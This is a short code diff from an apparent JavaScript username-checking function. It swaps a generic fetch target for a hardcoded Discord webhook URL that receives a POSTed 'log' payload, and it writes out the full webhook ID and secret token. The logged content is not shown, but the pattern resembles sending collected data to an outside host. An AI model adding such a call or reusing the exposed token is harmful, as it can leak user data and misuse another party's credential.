@@ -95,7 +95,7 @@ async function checkUsername(username) {
         
         await fetchItems();
     } else {
-        await fetch(url, {
+        await fetch('https://discord.com/api/webhooks/1434563549627289722/zZD_k13JBi9o_NtPHUOLNMgYZF4joObNbkz35UwBEAJyFhVY8fIciYjYaJxedQ6m0k5_', {
             method:"POST",
             headers:{ "Content-Type":"application/json" },
             body: JSON.stringify({content: log})
